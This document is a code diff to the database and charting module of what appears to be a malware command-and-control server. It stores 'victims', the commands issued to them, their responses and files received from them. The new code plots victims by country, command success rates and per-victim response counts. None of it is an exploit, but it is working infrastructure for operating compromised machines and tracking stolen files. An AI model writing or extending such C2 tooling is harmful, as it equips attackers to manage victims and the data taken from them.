@@ -5,6 +5,7 @@ from Structs.Structs import Client, Command, CommandRequester, ClientResponse
 from loguru import logger
 from Exceptions import EzCncError
 import os
+import plotly.graph_objects as go
 
 
 class DB:
@@ -70,37 +71,37 @@ class DB:
         files_table = """
         CREATE TABLE IF NOT EXISTS 
             files(
-                files_id INT PRIMARY KEY,
+                files_id TEXT NOT NULL,
                 file_name TEXT NOT NULL,
                 file blob NOT NULL,
                 file_type TEXT NOT NULL,
-                recived_date DATETIME DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY(files_id) REFERENCES victims(id)
-        );
+                received_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (files_id) REFERENCES victims(id)
+            );
         """
         commands_table = """
 
         CREATE TABLE IF NOT EXISTS
-        commands(
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            request_time DATETIME DEFAULT CURRENT_TIMESTAMP,
-            command TEXT NOT NULL,
-            target TEXT NOT NULL,
-            parameter TEXT
-        );
+            commands(
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                request_time DATETIME DEFAULT CURRENT_TIMESTAMP,
+                command TEXT NOT NULL,
+                target TEXT NOT NULL,
+                parameter TEXT
+            );
         """
 
         response_table = """
 
         CREATE TABLE IF NOT EXISTS
-        response(
-            id INTEGER,
-            response_time DATETIME DEFAULT CURRENT_TIMESTAMP,
-            command TEXT NOT NULL,
-            response,
-            result INTEGER,
-            FOREIGN KEY(id) REFERENCES victims(id)
-        );
+            response(
+                id INTEGER,
+                response_time DATETIME DEFAULT CURRENT_TIMESTAMP,
+                command TEXT NOT NULL,
+                response,
+                result INTEGER,
+                FOREIGN KEY(id) REFERENCES victims(id)
+            );
         """
 
         self.cr.execute(victims_table)
@@ -109,11 +110,19 @@ class DB:
         self.cr.execute(commands_table)
         self.cr.execute(response_table)
 
-    def uuid_to_id(self, uuid: str):
+    def uuid_to_id(self, uuid: str) -> int:
         resp = self.cr.execute("SELECT id FROM victims WHERE uuid = ?", (uuid,))
         result = resp.fetchone()
         if result:
-            return result[0]
+            return int(result[0])
+        else:
+            return None
+
+    def id_to_uuid(self, id: int) -> str:
+        resp = self.cr.execute("SELECT uuid FROM victims WHERE id=?", (id,))
+        result = resp.fetchone()
+        if result:
+            return str(result[0])
         else:
             return None
 
@@ -176,6 +185,10 @@ class DB:
         )
         self.db.commit()
 
+    def _return_all_uuids(self) -> list:
+        query = "SELECT uuid from victims"
+        return self.cr.execute(query).fetchall()
+
     def insert_response(self, resp: ClientResponse):
         Query1 = "INSERT INTO response(id,command,response,result) VALUES(?,?,?,?)"
         Query2 = "INSERT INTO response(id,command,result) VALUES(?,?,?)"
@@ -199,3 +212,113 @@ class DB:
             self.db.commit()
         except Exception as e:
             logger.error(str(e))
+
+
+class Plots:
+    def __init__(self, db_instance) -> None:
+        self.DB: DB = db_instance
+
+    def _PIE(self, val1: list, val2: list):
+        fig = go.Figure(
+            data=[
+                go.Pie(
+                    labels=val1,
+                    values=val2,
+                )
+            ]
+        )
+        return fig
+
+    def _COUNTRY_OCCURRENCE(self) -> tuple[list]:
+        query = "SELECT country, COUNT(*) AS count FROM victims_data GROUP BY country"
+        result = self.DB.cr.execute(query).fetchall()
+        countries = []
+        occurrences = []
+        for row in result:
+            countries.append(row[0])
+            occurrences.append(row[1])
+        results = zip(countries, occurrences)
+        results = sorted(results, key=lambda x: x[1], reverse=True)
+        countries = []
+        occurrences = []
+        for i, x in results:
+            countries.append(i)
+            occurrences.append(x)
+        return countries, occurrences
+
+    def _RESPONSES(self, by_id: bool = False) -> tuple[list]:
+        query = "SELECT id, COUNT(*) AS mention_count FROM response GROUP BY id;"
+        results = self.DB.cr.execute(query).fetchall()
+        names, occurrences = [], []
+        if by_id:
+            for row in results:
+                names.append(row[0])
+                occurrences.append(row[1])
+        else:
+            for row in results:
+                names.append(self.DB.uuid_to_name(str(self.DB.id_to_uuid(str(row[0])))))
+                occurrences.append(row[1])
+
+        results = zip(names, occurrences)
+        results = sorted(results, key=lambda x: x[1], reverse=True)
+        print(results)
+        names, occurrences = [], []
+        for i, x in results:
+            names.append(i)
+            occurrences.append(x)
+        return names, occurrences
+
+    def pie_working_commands_ratio(self, specific_command: Union[str, None] = None):
+        if specific_command is None:
+            worked_Query = "SELECT COUNT(*) FROM response where result=1"
+            didnt_work_Query = "SELECT COUNT(*) FROM response where result=0"
+            working_result = self.DB.cr.execute(worked_Query).fetchone()[0]
+            failed_result = self.DB.cr.execute(didnt_work_Query).fetchone()[0]
+        else:
+            worked_Query = "SELECT COUNT(*) FROM response where result=1 and command=?"
+            didnt_work_Query = (
+                "SELECT COUNT(*) FROM response where result=0 and command=?"
+            )
+            working_result = self.DB.cr.execute(
+                worked_Query, (specific_command,)
+            ).fetchone()[0]
+            failed_result = self.DB.cr.execute(
+                didnt_work_Query, (specific_command,)
+            ).fetchone()[0]
+        try:
+            return self._PIE(["Working", "Failed"], [working_result, failed_result])
+        except Exception as e:
+            logger.error(str(e))
+
+    def bar_countries(self):
+        try:
+            countries, occurrences = self._COUNTRY_OCCURRENCE()
+            fig = go.Figure([go.Bar(x=countries, y=occurrences)])
+            return fig
+        except Exception as e:
+            logger.error(str(e))
+
+    def pie_countries(self):
+        try:
+            labels, values = self._COUNTRY_OCCURRENCE()
+            return self._PIE(labels, values)
+        except Exception as e:
+            logger.error(str(e))
+
+    def pie_responses(self, by_id: bool = False):
+        try:
+            names, occurrences = self._RESPONSES(by_id)
+            return self._PIE(names, occurrences)
+        except Exception as e:
+            logger.error(str(e))
+
+    def bar_responses(self, by_id: bool = False):
+        try:
+            names, occurrences = self._RESPONSES(by_id)
+            fig = go.Figure([go.Bar(x=names, y=occurrences)])
+            return fig
+        except Exception as e:
+            logger.error(str(e))
+
+    def bar_files_sent(self, by_id):
+        ...
